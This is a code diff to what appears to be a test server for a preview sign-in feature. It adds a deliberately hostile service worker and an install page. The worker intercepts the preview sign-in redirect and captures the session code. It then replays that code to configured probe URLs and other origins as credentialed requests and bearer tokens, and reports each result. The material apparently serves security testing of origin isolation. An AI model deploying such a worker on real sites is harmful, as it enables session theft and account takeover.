@@ -53,9 +53,102 @@ const WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
 
 function html(marker: string, body: string): string {
   return `<!doctype html><html><head><meta charset="utf-8"><title>${marker}</title>
+<link rel="icon" href="data:,">
 <link rel="stylesheet" href="/assets/app.css"></head>
 <body data-service-marker="${marker}"><main>${body}</main>
 <script type="module" src="/assets/app.js"></script></body></html>`;
+}
+
+/**
+ * A hostile service worker for the preview sign-in path. It takes over every
+ * request under `/__orkestrator_preview/`, so the session-code redirect that
+ * follows a bootstrap never reaches the backend: re-sign-in is blocked until
+ * the site's data is cleared. With the code it captured it then tries every
+ * other authority it was told about (its script URL's query):
+ *
+ * - `probe=<url>`: a credentialed GET and POST (`no-cors`), and a `cors` GET
+ *   carrying the code as a bearer token;
+ * - `session=<origin>`: the code at that origin's own session path.
+ *
+ * It answers the navigation itself with a page whose `#hostile-report`
+ * holds what it saw and what each attempt returned. Every other request goes
+ * to the network unchanged.
+ */
+function hostileWorker(marker: string): string {
+  return `const params = new URL(self.location.href).searchParams;
+const probes = params.getAll("probe");
+const sessions = params.getAll("session");
+self.addEventListener("install", () => self.skipWaiting());
+self.addEventListener("activate", (event) => event.waitUntil(self.clients.claim()));
+async function attempt(kind, url, init) {
+  try {
+    const response = await fetch(url, init);
+    let body = null;
+    if (response.type === "basic" || response.type === "cors") {
+      body = (await response.text()).slice(0, 200);
+    }
+    return { kind, url, type: response.type, status: response.status, body };
+  } catch (error) {
+    return { kind, url, error: String(error && error.message ? error.message : error) };
+  }
+}
+async function intercept(request) {
+  const url = new URL(request.url);
+  const code = url.searchParams.get("code");
+  const attempts = [];
+  for (const probe of probes) {
+    attempts.push(await attempt("get", probe, { credentials: "include", mode: "no-cors" }));
+    attempts.push(
+      await attempt("post", probe, {
+        method: "POST",
+        credentials: "include",
+        mode: "no-cors",
+        body: "code=" + encodeURIComponent(code || ""),
+      }),
+    );
+    attempts.push(
+      await attempt("bearer", probe, {
+        credentials: "include",
+        mode: "cors",
+        headers: { authorization: "Bearer " + (code || "") },
+      }),
+    );
+  }
+  for (const origin of sessions) {
+    attempts.push(
+      await attempt("session", origin + url.pathname + "?code=" + encodeURIComponent(code || ""), {
+        credentials: "include",
+        mode: "no-cors",
+      }),
+    );
+  }
+  const report = {
+    worker: ${JSON.stringify(marker)},
+    captured: {
+      url: request.url,
+      method: request.method,
+      mode: request.mode,
+      destination: request.destination,
+      code,
+    },
+    attempts,
+  };
+  const text = JSON.stringify(report).replace(/</g, "\\\\u003c");
+  return new Response(
+    '<!doctype html><html><body data-hostile-session="intercepted"><pre id="hostile-report">' +
+      text +
+      "</pre></body></html>",
+    { headers: { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" } },
+  );
+}
+self.addEventListener("fetch", (event) => {
+  const path = new URL(event.request.url).pathname;
+  if (path.startsWith("/__orkestrator_preview/")) {
+    event.respondWith(intercept(event.request));
+  } else {
+    event.respondWith(fetch(event.request));
+  }
+});`;
 }
 
 function send(
@@ -325,6 +418,40 @@ self.addEventListener("fetch", (event) => {
 });`,
         { "x-service-marker": marker, "cache-control": "no-store" },
       );
+    }
+    if (path === "/sw-hostile/install") {
+      // Registers the hostile worker at scope `/`, passing this page's query
+      // (its probe targets) through to the worker script.
+      return send(
+        response,
+        200,
+        "text/html; charset=utf-8",
+        html(
+          marker,
+          `<h1>${marker} hostile worker</h1><script>
+const script = new URL("/sw-hostile.js" + location.search, location.href).href;
+navigator.serviceWorker.register(script, { scope: "/" }).then(
+  async (registration) => {
+    // A re-install with other targets replaces the active worker; wait for it.
+    while (registration.active?.scriptURL !== script) {
+      await new Promise((resolve) => setTimeout(resolve, 25));
+    }
+    document.body.dataset.hostileWorker = "active";
+  },
+  (error) => {
+    document.body.dataset.hostileWorker = "failed: " + error.message;
+  },
+);
+</script>`,
+        ),
+        { "x-service-marker": marker, "cache-control": "no-store" },
+      );
+    }
+    if (path === "/sw-hostile.js") {
+      return send(response, 200, "text/javascript", hostileWorker(marker), {
+        "x-service-marker": marker,
+        "cache-control": "no-store",
+      });
     }
     if (path === "/csp") {
       return send(response, 200, "text/html", html(marker, "csp"), {
